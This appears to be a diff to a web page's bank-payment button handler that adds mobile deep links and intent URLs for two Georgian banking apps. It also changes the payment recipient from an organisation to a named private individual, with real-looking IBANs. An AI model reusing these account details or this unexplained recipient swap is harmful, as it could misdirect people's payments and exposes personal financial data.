@@ -1195,10 +1195,17 @@
       // Handle Bank Button Clicks (Computer Web Portals vs Mobile App Deep Links)
       function handleBankButtonClick(bankType, btnElement) {
         const isMob = isMobileDevice();
-        const targetIban = "GE93BG0000000192399800";
-        const recipient = "ა(ა)იპ იდენტობის განვითარების ცენტრი";
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+        const isAndroid = /Android/i.test(navigator.userAgent);
+
+        const targetIban = bankType === "tbc" ? "GE42TB7845636020100005" : "GE93BG0000000192399800";
+        const recipient = "ანი მაისურაძე";
         const rawPurpose = (purposeText ? purposeText.textContent.trim() : "").replace(/\s+/g, " ") || "რეგისტრაციის საფასური";
         const fullPaymentDetails = `${targetIban}\n${recipient}\n${rawPurpose}`;
+
+        // Update displayed IBAN in UI card
+        const ibanTextEl = document.getElementById("iban-text");
+        if (ibanTextEl) ibanTextEl.textContent = targetIban;
 
         // 1. Copy all payment details to clipboard synchronously
         try {
@@ -1233,15 +1240,41 @@
         } else {
           // Mobile Phone: Open Mobile Bank Apps directly with fallback
           if (bankType === "bog") {
-            window.location.href = "bogmbank://";
-            setTimeout(() => {
-              window.open("https://ibank.bog.ge/", "_blank");
-            }, 1500);
+            if (isAndroid) {
+              window.location.href = "intent://#Intent;package=ge.bog.mobilebank;scheme=bogmbank;S.browser_fallback_url=https%3A%2F%2Fibank.bog.ge%2F;end";
+            } else if (isIOS) {
+              const start = Date.now();
+              window.location.href = "bogmbank://";
+              setTimeout(() => {
+                if (document.hidden || document.webkitHidden) return;
+                if (Date.now() - start < 3000) {
+                  window.location.href = "https://ibank.bog.ge/";
+                }
+              }, 1800);
+            } else {
+              window.location.href = "bogmbank://";
+              setTimeout(() => {
+                if (!document.hidden) window.location.href = "https://ibank.bog.ge/";
+              }, 1500);
+            }
           } else if (bankType === "tbc") {
-            window.location.href = "tbcbank://";
-            setTimeout(() => {
-              window.open("https://tbconline.ge/tbcrd/login?", "_blank");
-            }, 1500);
+            if (isAndroid) {
+              window.location.href = "intent://#Intent;package=com.tbc.mobile.bank;scheme=tbcmobilebank;S.browser_fallback_url=https%3A%2F%2Ftbconline.ge%2Ftbcrd%2Flogin%3F;end";
+            } else if (isIOS) {
+              const start = Date.now();
+              window.location.href = "tbcmobilebank://";
+              setTimeout(() => {
+                if (document.hidden || document.webkitHidden) return;
+                if (Date.now() - start < 3000) {
+                  window.location.href = "https://tbconline.ge/tbcrd/login?";
+                }
+              }, 1800);
+            } else {
+              window.location.href = "tbcmobilebank://";
+              setTimeout(() => {
+                if (!document.hidden) window.location.href = "https://tbconline.ge/tbcrd/login?";
+              }, 1500);
+            }
           }
         }
       }
